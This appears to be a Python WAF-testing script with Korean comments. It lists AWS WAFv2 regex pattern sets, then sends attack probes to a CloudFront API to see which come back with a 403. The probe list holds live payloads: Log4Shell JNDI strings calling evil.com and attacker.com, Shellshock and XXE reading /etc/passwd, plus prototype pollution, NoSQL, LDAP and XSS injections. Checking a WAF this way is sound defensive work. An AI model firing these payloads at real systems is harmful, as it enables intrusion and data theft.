import requests, sys, urllib3, boto3, json
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# 1. WAF 패턴셋 확인
print("=== WAF 패턴셋 현재 상태 ===")
waf = boto3.client("wafv2", region_name="us-east-1")
for ps in waf.list_regex_pattern_sets(Scope="CLOUDFRONT")["RegexPatternSets"]:
    if "attack" in ps["Name"]:
        resp = waf.get_regex_pattern_set(Name=ps["Name"], Scope="CLOUDFRONT", Id=ps["Id"])
        pats = resp["RegexPatternSet"]["RegularExpressionList"]
        print(f"\n{ps['Name']} ({len(pats)} entries):")
        for i, p in enumerate(pats):
            r = p["RegexString"]
            has_proto = "__proto__" in r
            has_nosql = "\\$" in r or "$gt" in r
            has_uri = "://" in r
            has_ldap = "*)(" in r or "\\*\\)" in r
            tags = []
            if has_proto: tags.append("proto")
            if has_nosql: tags.append("nosql")
            if has_uri: tags.append("://")
            if has_ldap: tags.append("ldap")
            tag = f" [{','.join(tags)}]" if tags else ""
            print(f"  {i+1}. {r[:90]}{tag}")

# 2. 실제 body 공격 프로빙
print("\n\n=== Body 공격 프로빙 ===")
BASE = "https://d3rmw7q46yjlwq.cloudfront.net"
H = {"Content-Type": "application/json"}

probes = [
    ("__proto__", {"headers": H, "json": {"__proto__": {"admin": True}, "requestid": "1", "uuid": "x", "username": "h", "email": "h@h.com"}}),
    ("constructor:{}", {"headers": H, "json": {"constructor": {"prototype": {"x": 1}}, "requestid": "1", "uuid": "x", "id": "x", "name": "x", "price": 1}}),
    ("nosql $gt body", {"headers": H, "json": {"requestid": "1", "uuid": "x", "username": {"$gt": ""}, "email": "a@b.com"}}),
    ("open redirect ://", {"headers": H, "json": {"requestid": "1", "uuid": "x", "username": "r", "email": "http://evil.com@x.com"}}),
    ("LDAP *)(&", {"headers": H, "json": {"requestid": "1", "uuid": "x", "username": "*)(&", "email": "l@x.com"}}),
    ("log4shell jndi", {"headers": H, "data": "${jndi:ldap://evil.com/x}"}),
    ("shellshock", {"headers": H, "data": "() { :; }; cat /etc/passwd"}),
    ("xxe", {"headers": {"Content-Type": "application/xml"}, "data": '<?xml version="1.0"?><!DOCTYPE f[<!ENTITY x SYSTEM "file:///etc/passwd">]><f>&x;</f>'}),
    ("xss body", {"headers": H, "data": "<script>alert(1)</script>"}),
    ("log4j obfusc", {"headers": H, "data": "${${lower:j}ndi:${lower:l}dap://x/a}"}),
    ("shellshock v2", {"headers": H, "data": "() { _; } >_[$($())] { /bin/bash -c 'id'; }"}),
    ("jndi rmi", {"headers": H, "data": "${jndi:rmi://attacker.com/obj}"}),
    ("jndi dns", {"headers": H, "data": "${jndi:dns://evil.com/a}"}),
]

slips = []
for name, kwargs in probes:
    url = f"{BASE}/v1/user"
    r = requests.post(url, timeout=5, verify=False, **kwargs)
    mark = "  " if r.status_code == 403 else "!!"
    print(f"{mark} {name:<25} -> {r.status_code}")
    if r.status_code != 403:
        slips.append((name, r.status_code))

print(f"\nBlocked: {len(probes)-len(slips)}/{len(probes)}")
if slips:
    print("SLIPS:")
    for n, s in slips:
        print(f"  {n} -> {s}")
else:
    print("ALL BLOCKED!")
